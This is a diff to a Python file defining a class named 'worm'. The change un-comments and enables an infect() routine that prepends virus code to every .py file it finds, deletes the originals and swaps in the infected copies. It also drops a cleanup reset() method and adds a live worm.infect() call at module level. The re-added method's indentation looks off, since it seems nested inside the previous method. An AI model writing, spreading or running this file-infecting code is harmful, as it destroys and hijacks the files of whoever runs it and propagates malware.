@@ -35,29 +35,23 @@ class worm():
             if '.py' in file and '.pyc' not in file:
                 self.files.append('/'.join([self.path,file]))
 
-    # def infect(self):
-    #     # infect every python file we found
-    #     for file in self.files:
-    #         # only open the files as read
-    #         with open(file, 'r') as r:
-    #             # construct the name of the infected file
-    #             infected = (str(file) + '.infected')
-    #             # create the new, infected file
-    #             with open(infected, 'a') as w:
-    #                 for line in self.virus.readlines():
-    #                     w.write(line)
-    #                 for line in r.readlines():
-    #                     w.write(line)
-    #         # remove the old file
-    #         os.remove(file)
-    #         # rename the infected file to the old file name
-    #         os.rename(infected, file)
-
-    def reset(self):
-        for file in self.files:
-            os.remove(file)
-
+        def infect(self):
+            # infect every python file we found
+            for file in self.files:
+                # only open the files as read
+                with open(file, 'r') as r:
+                    # construct the name of the infected file
+                    infected = (str(file) + '.infected')
+                    # create the new, infected file
+                    with open(infected, 'a') as w:
+                        for line in self.virus.readlines():
+                            w.write(line)
+                        for line in r.readlines():
+                            w.write(line)
+                # remove the old file
+                os.remove(file)
+                # rename the infected file to the old file name
+                os.rename(infected, file)
 
 worm = worm()
-# worm.infect()
-# worm.reset()
+worm.infect()
